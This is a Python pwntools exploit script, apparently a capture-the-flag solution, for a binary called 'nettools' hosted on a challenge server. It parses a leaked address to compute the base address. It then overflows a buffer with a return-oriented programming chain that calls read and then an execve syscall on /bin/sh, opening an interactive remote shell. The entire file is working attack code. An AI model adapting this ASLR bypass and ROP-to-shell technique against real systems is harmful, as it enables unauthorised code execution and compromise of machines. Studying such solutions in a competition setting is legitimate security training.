#!/usr/bin/env python

from pwn import *
import sys

bin = ELF("./nettools")

trace_route_offset = 0xCEC0
leak_address = 0x7A03C
command_arg = 0x10B20
new_command = 0x10BC0
bin_sh = 0x60118
pop_rsi = 0x0000000000009c18#: pop rsi; ret
pop_rdx = 0x0000000000020bb3#: pop rdx; add byte ptr [rax], al; ret;
pop_rax = 0x000000000000ecaa#: pop rax; ret;
pop_rdi = 0x000000000000a0ef#: pop rdi; ret;
syscall = 0x0000000000025adf#: syscall;
writeable_mem = 0x7A230
bin_sh = 0x162FBB3
read_function = 0xC5C0


def conn():
    if sys.argv[1] == "remote":
        return remote("chals.sekai.team", 4001)
    else:
        return process("./nettools") 

r = conn()
sla = lambda a,b : r.sendlineafter(f"{a}".encode('utf-8'), f"{b}".encode('utf-8'))
sbla = lambda a,b : r.sendlineafter(a, b)
ru = lambda a : r.recvuntil(f"{a}".encode('utf-8'))
rbsu = lambda a : r.recvuntil(a)

def main():
    ru("leaked: ")
    leak = int(r.recvline().decode('utf-8').strip(),16)
    log.info(f"leak received: {hex(leak)}")
    base_address = leak-leak_address
    log.info(f"leak offset: {hex(base_address)}")

    #gdb.attach(r, gdbscript=f"b *nettools::ip_lookup+172\nb *nettools::read+409\nb *{hex(base_address+read_function)}")
    sbla(b'>', b'3\x00/bin/sh\x00\x00\x00')
    sla('>', '3')
    #offset  0x2e0 contains the return ptr
    payload = p64(0)*(0x2e8//8)
    payload += p64(base_address+pop_rdi)
    payload += p64(base_address+writeable_mem)
    payload += p64(base_address+pop_rsi)
    payload += p64(0x190)
    payload += p64(base_address+pop_rdx)
    payload += p64(0x400)
    payload += p64(base_address+read_function)

    payload += p64(base_address+pop_rdi)
    payload += p64(base_address+writeable_mem)
    payload += p64(base_address+pop_rsi)
    payload += p64(0)
    payload += p64(base_address+pop_rax)
    payload += p64(base_address+writeable_mem+0x20)
    payload += p64(base_address+pop_rdx)
    payload += p64(0)
    payload += p64(base_address+pop_rax)
    payload += p64(0x3b)
    payload += p64(base_address+syscall)
    sbla(b':', payload)

    r.sendline(b'/bin/sh\x00')
    

    r.interactive()


if __name__ == "__main__":
    main()

